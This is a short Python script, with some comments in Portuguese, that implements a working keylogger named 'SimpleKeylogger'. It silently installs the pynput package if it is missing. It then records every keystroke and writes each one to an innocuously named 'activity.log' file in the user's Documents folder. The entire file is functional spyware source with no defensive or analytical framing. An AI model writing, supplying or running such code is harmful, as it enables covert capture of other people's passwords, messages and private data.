import logging
import threading
import os
import subprocess
import sys

# Função para verificar e instalar o pacote pynput
def install_package(package):
    try:
        __import__(package)
    except ImportError:
        print(f'{package} was not found, attempting to download it..')
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
    finally:
        __import__(package)

# Tente importar o pynput
install_package('pynput')

from pynput import keyboard

class Keylogger:
    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    def start_logging(self):
        with keyboard.Listener(on_press=self._keydown_callback) as listener:
            listener.join()

    def _keydown_callback(self, key):
        try:
            logging.debug(f'{key.char}')
        except AttributeError:
            logging.debug(f'{key}') 

def run_keylogger():
    keylogger = Keylogger('SimpleKeylogger')
    keylogger.start_logging()

if __name__ == '__main__':
    documents_path = os.path.join(os.path.expanduser('~'), 'Documents') 
    log_file_path = os.path.join(documents_path, 'activity.log') 
    
    logging.basicConfig(
        level=logging.DEBUG,
        filename=log_file_path,
        format='Key: %(message)s',
    )
    
    keylogger_thread = threading.Thread(target=run_keylogger)
    keylogger_thread.start()
    keylogger_thread.join()
